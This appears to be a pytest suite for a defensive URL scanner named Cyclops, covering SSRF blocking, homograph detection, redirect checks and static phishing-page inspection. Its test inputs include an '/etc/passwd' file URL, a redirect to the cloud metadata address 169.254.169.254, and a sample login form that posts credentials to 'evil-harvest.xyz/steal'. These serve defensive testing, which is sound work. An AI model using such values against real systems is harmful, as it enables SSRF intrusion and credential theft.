"""
Comprehensive test suite for Cyclops URL Security Scanner.
Tests:
- URL validation and normalisation (missing scheme, domain-only, http/https, ports)
- Unsupported schemes and malformed URLs
- Sensitive parameter redaction and credential stripping
- IDN, Punycode, and Homograph character detection
- Raw IPv4 and IPv6 detection (public vs loopback/private/reserved)
- SSRF protections (localhost, 127.0.0.1, 10.x, 169.254.x cloud metadata, ::1)
- DNS rebinding prevention and redirect to private address
- Redirect chain tracking, hop limits, HTTPS-to-HTTP downgrade
- Read-only HTML parsing (forms, external action targets, password fields, non-execution)
- RDAP lookup handling (missing, rate-limited, recent domain)
- Reputation provider adapters (missing API keys, unavailable, clean, malicious)
- Multi-signal scoring and explainable reporting
- FastAPI /scan-url endpoint integration
"""
import pytest
import ipaddress
from unittest.mock import patch, AsyncMock, MagicMock
from fastapi.testclient import TestClient

from app.main import app
from app.scanner.url_validator import normalize_and_validate_url
from app.scanner.ssrf import (
    is_ip_blocked,
    resolve_and_validate_hostname,
    safe_fetch_url,
    SSRFValidationError,
    SafeFetchResult,
    RedirectHop
)
from app.scanner.html_inspector import analyze_static_html
from app.scanner.rdap import lookup_domain_rdap, DomainRegistrationInfo
from app.scanner.reputation import (
    check_google_safe_browsing,
    check_virustotal,
    check_abuseipdb
)
from app.scanner.url_scorer import compute_url_risk_report
from app.scanner.url_pipeline import orchestrate_url_scan


client = TestClient(app)


# --- 1. URL Normalization and Validation Tests ---

def test_normalization_domain_only():
    norm = normalize_and_validate_url("github.com")
    assert norm.scheme == "https"
    assert norm.hostname == "github.com"
    assert norm.normalized_url == "https://github.com/"
    assert norm.is_ip is False


def test_normalization_with_path_and_query():
    norm = normalize_and_validate_url("http://example.com/login?user=alice&session=secret123")
    assert norm.scheme == "http"
    assert norm.hostname == "example.com"
    assert norm.path == "/login"
    assert "session=[REDACTED]" in norm.sanitized_display_url
    assert "user=alice" in norm.sanitized_display_url


def test_normalization_rejects_unsupported_schemes():
    with pytest.raises(ValueError, match="Unsupported scheme 'ftp'"):
        normalize_and_validate_url("ftp://ftp.example.com/file.zip")

    with pytest.raises(ValueError, match="Unsupported scheme 'file'"):
        normalize_and_validate_url("file:///etc/passwd")

    with pytest.raises(ValueError, match="Unsupported scheme 'javascript'"):
        normalize_and_validate_url("javascript:alert(1)")


def test_normalization_embedded_credentials():
    norm = normalize_and_validate_url("https://admin:supersecret@example.com/dashboard")
    assert norm.credentials_detected is True
    assert norm.hostname == "example.com"
    assert "supersecret" not in norm.sanitized_display_url


def test_normalization_punycode_and_homograph():
    # Cyrillic 'a' (\u0430) instead of Latin 'a'
    homograph_url = "https://p\u0430ypal.com/verify"
    norm = normalize_and_validate_url(homograph_url)
    assert norm.has_homograph_chars is True
    assert norm.is_punycode or norm.ascii_hostname.startswith("xn--")
    assert len(norm.homograph_details) > 0


def test_normalization_raw_ip_hosts():
    norm_v4 = normalize_and_validate_url("http://198.51.100.1:8080/path")
    assert norm_v4.is_ip is True
    assert norm_v4.ip_version == 4
    assert norm_v4.port == 8080

    norm_v6 = normalize_and_validate_url("https://[2001:db8::1]/path")
    assert norm_v6.is_ip is True
    assert norm_v6.ip_version == 6


# --- 2. SSRF Protection Tests ---

def test_ssrf_blocks_loopback_and_private_ips():
    blocked, reason = is_ip_blocked(ipaddress.ip_address("127.0.0.1"))
    assert blocked is True
    assert "Loopback" in reason

    blocked, reason = is_ip_blocked(ipaddress.ip_address("10.0.1.5"))
    assert blocked is True
    assert "Private" in reason

    blocked, reason = is_ip_blocked(ipaddress.ip_address("192.168.1.1"))
    assert blocked is True
    assert "Private" in reason

    blocked, reason = is_ip_blocked(ipaddress.ip_address("172.16.0.1"))
    assert blocked is True
    assert "Private" in reason


def test_ssrf_blocks_cloud_metadata_link_local():
    # AWS / GCP metadata service 169.254.169.254
    blocked, reason = is_ip_blocked(ipaddress.ip_address("169.254.169.254"))
    assert blocked is True
    assert "Link-local" in reason or "blocked network" in reason


def test_ssrf_blocks_ipv6_loopback_and_ula():
    blocked, reason = is_ip_blocked(ipaddress.ip_address("::1"))
    assert blocked is True

    blocked, reason = is_ip_blocked(ipaddress.ip_address("fc00::1"))
    assert blocked is True


def test_resolve_and_validate_hostname_rejects_localhost():
    with pytest.raises(SSRFValidationError):
        resolve_and_validate_hostname("localhost")

    with pytest.raises(SSRFValidationError):
        resolve_and_validate_hostname("127.0.0.1")


# --- 3. Redirect and Downgrade Inspection ---

@pytest.mark.anyio
async def test_safe_fetch_stops_on_ssrf_redirect():
    # If a server responds with redirect to 169.254.169.254, safe_fetch must stop
    with patch("httpx.AsyncClient.get") as mock_get:
        mock_resp = MagicMock()
        mock_resp.status_code = 302
        mock_resp.headers = {"Location": "http://169.254.169.254/latest/meta-data/"}
        mock_get.return_value = mock_resp

        with patch("app.scanner.ssrf.resolve_and_validate_hostname") as mock_resolve:
            # First hop resolves to public IP
            mock_resolve.side_effect = [
                ["93.184.216.34"],
                SSRFValidationError("Link-local/metadata address forbidden.")
            ]
            res = await safe_fetch_url("https://example.com/redirect")
            assert res.stopped_reason is not None
            assert "Security Policy Blocked" in res.stopped_reason


@pytest.mark.anyio
async def test_safe_fetch_detects_https_to_http_downgrade():
    with patch("httpx.AsyncClient.get") as mock_get:
        mock_resp_1 = MagicMock()
        mock_resp_1.status_code = 301
        mock_resp_1.headers = {"Location": "http://insecure.example.com/"}

        mock_resp_2 = MagicMock()
        mock_resp_2.status_code = 200
        mock_resp_2.headers = {"Content-Type": "text/html"}
        mock_resp_2.content = b"<html><title>Insecure</title><body>Hello</body></html>"
        mock_resp_2.encoding = "utf-8"

        mock_get.side_effect = [mock_resp_1, mock_resp_2]

        with patch("app.scanner.ssrf.resolve_and_validate_hostname") as mock_resolve:
            mock_resolve.return_value = ["93.184.216.34"]
            res = await safe_fetch_url("https://example.com/")
            assert len(res.redirect_chain) == 1
            assert res.redirect_chain[0].scheme_downgraded is True
            assert res.final_url == "http://insecure.example.com/"


# --- 4. Static Read-Only HTML Inspection Tests ---

def test_html_inspector_extracts_forms_and_passwords():
    html = """
    <!DOCTYPE html>
    <html>
      <head><title>Sign in to your account</title></head>
      <body>
        <h1>Urgent Action Required</h1>
        <form action="https://evil-harvest.xyz/steal" method="POST">
          <input type="text" name="username" placeholder="Email address" />
          <input type="password" name="password" />
          <button type="submit">Sign In</button>
        </form>
        <script>alert('malicious script that must NOT execute');</script>
      </body>
    </html>
    """
    analysis = analyze_static_html(html, "login.example.com")
    assert analysis.title == "Sign in to your account"
    assert analysis.has_password_input is True
    assert analysis.has_external_form_action is True
    assert analysis.script_count == 1
    assert "urgent action required" in [p.lower() for p in analysis.matched_phrases]
    assert "Client-side JavaScript was NOT executed." in analysis.limitations


def test_html_inspector_safe_on_empty_or_malformed():
    analysis = analyze_static_html("<<>>invalid <<head><title>Test", "example.com")
    assert analysis.status == "completed"
    assert analysis.has_password_input is False


# --- 5. RDAP Domain Registration Tests ---

@pytest.mark.anyio
async def test_rdap_lookup_handles_errors():
    with patch("httpx.AsyncClient.get") as mock_get:
        mock_get.side_effect = Exception("Network unreachable")
        res = await lookup_domain_rdap("example.com")
        assert res.status == "unavailable"
        assert "error" in res.error.lower()


# --- 6. Reputation Provider Tests ---

@pytest.mark.anyio
async def test_reputation_unconfigured_when_no_env_key():
    with patch.dict("os.environ", {}, clear=True):
        gsb = await check_google_safe_browsing("https://example.com")
        assert gsb.status == "not_configured"

        vt = await check_virustotal("https://example.com")
        assert vt.status == "not_configured"

        abuse = await check_abuseipdb("93.184.216.34")
        assert abuse.status == "not_configured"


# --- 7. Full Pipeline Integration & Endpoint Tests ---

@pytest.mark.anyio
async def test_orchestrate_url_scan_loopback_blocked():
    report = await orchestrate_url_scan("http://127.0.0.1:8000/admin")
    assert report.risk_level in ("HIGH", "CRITICAL", "MEDIUM")
    assert report.normalization.is_loopback is True
    assert "Security Policy" in report.redirect_analysis.error or "SSRF" in report.redirect_analysis.error


def test_fastapi_scan_url_endpoint():
    # Valid domain scan request
    with patch("app.scanner.url_pipeline.safe_fetch_url") as mock_fetch:
        mock_fetch.return_value = SafeFetchResult(
            final_url="https://example.com/",
            initial_url="https://example.com/",
            final_status_code=200,
            final_resolved_ip="93.184.216.34",
            html_content="<html><head><title>Example</title></head><body>Welcome</body></html>"
        )
        response = client.post("/scan-url", json={"url": "example.com"})
        assert response.status_code == 200
        data = response.json()
        assert data["submitted_url"] == "example.com"
        assert data["normalized_url"] == "https://example.com/"
        assert data["risk_level"] in ("LOW", "MEDIUM", "HIGH", "CRITICAL")
        assert "plain_english_explanation" in data


def test_fastapi_scan_url_invalid_scheme():
    response = client.post("/scan-url", json={"url": "ftp://bad.com"})
    assert response.status_code == 400
    assert "Unsupported scheme" in response.json()["message"]


def test_existing_email_scan_endpoint_intact():
    # Verify regression test: email scanner must continue to work perfectly
    response = client.post("/scan-email", json={
        "sender": "Security <urgent@paypa1-update.com>",
        "subject": "Urgent: Verify your credentials now",
        "body": "Please login to your account immediately to unlock access."
    })
    assert response.status_code == 200
    data = response.json()
    assert data["status"] == "completed"
    assert data["threat_score"] > 2.0
